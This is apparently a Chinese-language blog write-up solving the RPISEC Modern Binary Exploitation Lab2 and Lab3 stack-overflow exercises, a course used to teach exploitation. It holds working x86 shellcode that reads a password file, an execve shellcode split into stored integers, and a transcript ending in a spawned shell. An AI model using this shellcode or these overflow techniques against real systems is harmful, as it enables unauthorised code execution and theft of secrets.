---
layout: post
title: "MBE Lab2 and Lab3 Write Up"
---

# 0x00 背景

俗话说站在岸上学不会游泳，这篇文章则是对Modern Binary Exploitation中[Lab2](https://github.com/RPISEC/MBE/tree/master/src/lab02)和[Lab3](https://github.com/RPISEC/MBE/tree/master/src/lab03)的write up。对应环境为ubuntu 14.04 x86 关闭了ASLR，并按照注释编译生成elf文件。

<!-- more -->

# 0x01 Lab2

## lab2C

strcpy向下溢出覆盖set_me即可，反汇编可看出相对偏移：

![][1]

注意下大小端问题即可：

![][2] 

## lab2B

有点ret2text的意思，反汇编查看填充字节数：

![][3]

查找一下全局变量的的地址：

![][4]

最后依次向下覆盖`padding+ebp+eip+padding+arg(exec_string)`即可：

![][5]

## lab2A

```c
void concatenate_first_chars()
{
	struct {
		char word_buf[12];
		int i;
		char* cat_pointer;
		char cat_buf[10];
	} locals;
	locals.cat_pointer = locals.cat_buf;

	printf("Input 10 words:\n");
	for(locals.i=0; locals.i!=10; locals.i++)
	{
		// Read from stdin
		if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
		{
			printf("Failed to read word\n");
			return;
		}
		// Copy first char from word to next location in concatenated buffer
		*locals.cat_pointer = *locals.word_buf;
		locals.cat_pointer++;
	}

	// Even if something goes wrong, there's a null byte here
	//   preventing buffer overflows
	locals.cat_buf[10] = '\0';
	printf("Here are the first characters from the 10 words concatenated:\n\
%s\n", locals.cat_buf);
}
```

虽然fget控制了16字节，但是locals.word_buf向下跨越覆盖locals.i，不受循环次数限制慢慢copy locals.cat_pointer覆盖eip。构造好input后在gdb中可以良好运行执行shell，但在命令行中通过管道exploit总是会直接出现Segmentation fault。无奈gg后得知，是在正确弹出交互shell后，其stdin认为我们通过管道传递的input 到了EOF所以会关闭，这才导致无法交互shell。所以就有了一个[trick](https://groheresearch.blogspot.com/2017/06/rpisec-modern-binary-exploitation-lab-2.html)：`(echo "payload" && cat) | ./interactive_shell`：

![][6]

# 0x02 Lab3

## lab3C

很正常的向64字节的数组中fget 0x64字节造成溢出，此题的本意是想让我们覆盖eip为栈上shellcode的起始地址，但是在gdb调试过程中覆盖ebx为0x90909090后，在执行ret指令时居然会出现`Cannot access memory at address 0x90909094`的[错误](https://stackoverflow.com/questions/19506337/gdb-ret-cannot-access-memory-at-address)，虽然有些违反尝试但在外部正常传入shellcode的时候还是正常反应。

在gdb中一切都调试好后，在外部运行时又产生段错误，gg后发现为在gdb调试过程中栈地址会发生变化，所以原来的ret的栈地址就很有可能指向违法指令了，其实课程中也早已给了[提示](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/8/08_lab.pdf)，审题还是很重要的呀。

遂运行时接上ltrace查看fget返回的栈地址：

![][7]

对应替换一下就ok了：

![][8]

## lab3B

该题也很直接是溢出，但要求我们不能使用exec系统调用去读取.pass文件的内容，从C语言的角度来想是要实现这种效果：

```
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main()
{
    int fd;
    char content[8] = {0};
    fd = open(".pass", O_RDONLY);
    read(fd, content, 8);
    write(STDOUT_FILENO, content, 8);
    exit(0);
}
```

因为直接使用系统调用，所以linux上的shellcode比windows上好构造得多，只要了解系统调用的[传参方式](https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html)，[照葫芦画瓢](http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=push+0%0D%0Apush+0%0D%0Apush+0x73%0D%0Apush+0x7361702e%0D%0Axor+eax%2Ceax%0D%0Axor+ebx%2Cebx%0D%0Axor+ecx%2Cecx%0D%0Axor+edx%2Cedx%0D%0Amov+ebx%2Cesp%0D%0Amov+al%2C5%0D%0Aint+0x80%0D%0Amov+ebx%2Ceax%0D%0Alea+ecx%2C%5Besp-8%5D%0D%0Amov+dl%2C0x8%0D%0Amov+eax%2C3%0D%0Aint+0x80%0D%0Amov+ebx%2C1%0D%0Amov+al%2C4%0D%0Aint+0x80%0D%0Amov+al%2C1%0D%0Axor+ebx%2Cebx%0D%0Aint+0x80&arch=x86-32#assembly)即可：

```
push 0
push 0
push 0x73
push 0x7361702e
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx
mov ebx,esp
mov al,5
int 0x80
mov ebx,eax
lea ecx,[esp-8]
mov dl,0x8
mov eax,3
int 0x80
mov ebx,1
mov al,4
int 0x80
mov al,1
xor ebx,ebx
int 0x80

Little endian:

"\x6a\x00\x6a\x00\x6a\x73\x68\x2e\x70\x61\x73\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe3\xb0\x05\xcd\x80\x89\xc3\x8d\x4c\x24\xf8\xb2\x08\xb8\x03\x00\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\xb0\x04\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
```

本地验证一哈：

![][9]

既然shellcode也有了，其他方式和上一题一样处理就ok了：

![][10]

## lab3A

该题目一眼看出可以利用read_number实现任意地址读，利用store_number实现任意地址写。虽然存储的数组data的类型为unsigned int，貌似只能读取向下的地址就无法泄露出data数组的起始地址，但该程序为32位正好是四个字节，大地址相加后也就是符合负数补码的规律，结合反汇编可以知道在调用read_number函数时data数组的起始地址和保存data参数栈地址的偏移为-0x28：

![][11]

补码形式为`0xffffffd8`，通过read index `1073741814`即可得到data数组的起始地址。根据类似前面的计算偏移，store index `113`即为覆盖了保存的eip地址。因为代码中的store index要求不能被三整除，所以我们`ret`至`data+4`的地址即可。同时也要调整我们的shellcode，利用短跳`\xeb`跳过被3整除的`0x00000000`指令段，构造方法也是比较[简单的](http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+eax%2C+eax%0D%0Apush+eax%0D%0Anop%0D%0Ajmp+12%0D%0Anop%0D%0Anop%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Apush+0x68732f2f%0D%0Ajmp+24%0D%0Anop%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Apush+0x6e69622f%0D%0Ajmp+36%0D%0Anop%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Amov+ebx%2C+esp%0D%0Amov+ecx%2C+eax%0D%0Ajmp+48%0D%0Anop%0D%0Anop%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Amov+edx%2C+eax%0D%0Amov+al%2C+0x0b%0D%0Ajmp+60%0D%0Anop%0D%0Anop%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Aint+0x80%0D%0Axor+eax%2C+eax%0D%0Ajmp+72%0D%0Anop%0D%0Anop%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Aadd+byte+ptr+%5Beax%5D%2C+al%0D%0Ainc+eax%0D%0Aint+0x80%0D%0Anop&arch=x86-32#assembly)，实践过程中还发现了原始ppt中的一个[书写错误](https://github.com/RPISEC/MBE/issues/38)。

shellcode还要多次输入，结合python脚本运行起来才比较轻松，但32位的pwntools安装就是各种问题，subprocess对运行elf也是莫名地阻塞，嫌麻烦最后手动输入即可pwn：

```
larry@binexp:~/MBE/src/lab03$ ./lab3A
----------------------------------------------------
  Welcome to quend's crappy number storage service!  
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   quend has reserved some storage for herself :>    
----------------------------------------------------

Input command: read
 Index: 1073741814
 Number at data[1073741814] is 3221221000
 Completed read command successfully
Input command: store
 Number: 3221221004
 Index: 113
 Completed store command successfully
Input command: store
 Number: 2421211185
 Index: 1
 Completed store command successfully
Input command: store 
 Number: 2425358059
 Index: 2
 Completed store command successfully
Input command: store
 Number: 1932472168
 Index: 4
 Completed store command successfully
Input command: store
 Number: 2416307048
 Index: 5
 Completed store command successfully
Input command: store
 Number: 1768042344
 Index: 7
 Completed store command successfully
Input command: store
 Number: 2416307054
 Index: 8
 Completed store command successfully
Input command: store
 Number: 3247039369
 Index: 10
 Completed store command successfully
Input command: 2425358059
 Failed to do 2425358059 command
Input command: store
 Number: 2425358059
 Index: 11
 Completed store command successfully
Input command: store
 Number: 196133513
 Index: 13
 Completed store command successfully
Input command: store
 Number: 2425358059
 Index: 14
 Completed store command successfully
Input command: store
 Number: 3224469709
 Index: 16
 Completed store command successfully
Input command: store
 Number: 2425358059
 Index: 17
 Completed store command successfully
Input command: store
 Number: 2424360256
 Index: 19
 Completed store command successfully
Input command: quit
$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
$ exit
```

# 0x03 总结

下来想想如果直接搭建官方提供的虚拟机去做lab题目，环境相关的问题应该比另起炉灶少很多，另外在64位系统上使用pwntools exploit 32位程序也是可以[试试的](https://www.anquanke.com/post/id/85138)。

[1]: https://wx2.sinaimg.cn/large/ee2fecafly1fown1sqkxsj20k3054aao.jpg
[2]: https://wx2.sinaimg.cn/large/ee2fecafly1fown1tewd6j20k103274i.jpg
[3]: https://wx4.sinaimg.cn/large/ee2fecafly1fown1u64qqj20k404yjrw.jpg
[4]: https://wx4.sinaimg.cn/large/ee2fecafly1fown1utbtbj20jz032glt.jpg
[5]: https://wx4.sinaimg.cn/large/ee2fecafly1fown1w7uo1j20jz031jrr.jpg
[6]: https://wx4.sinaimg.cn/large/ee2fecafly1fown1wyv1aj20k0042dga.jpg
[7]: https://wx3.sinaimg.cn/large/ee2fecafly1fown1y6sylj20k1087gmv.jpg
[8]: https://wx1.sinaimg.cn/large/ee2fecafly1fown1z5w0nj20k40623z9.jpg
[9]: https://wx1.sinaimg.cn/large/ee2fecafly1fown2000xuj20k007ggm7.jpg
[10]: https://wx3.sinaimg.cn/large/ee2fecafly1fown20tsxlj20k203jmxj.jpg
[11]: https://wx1.sinaimg.cn/large/ee2fecafly1fown21yps7j20k5042q3i.jpg
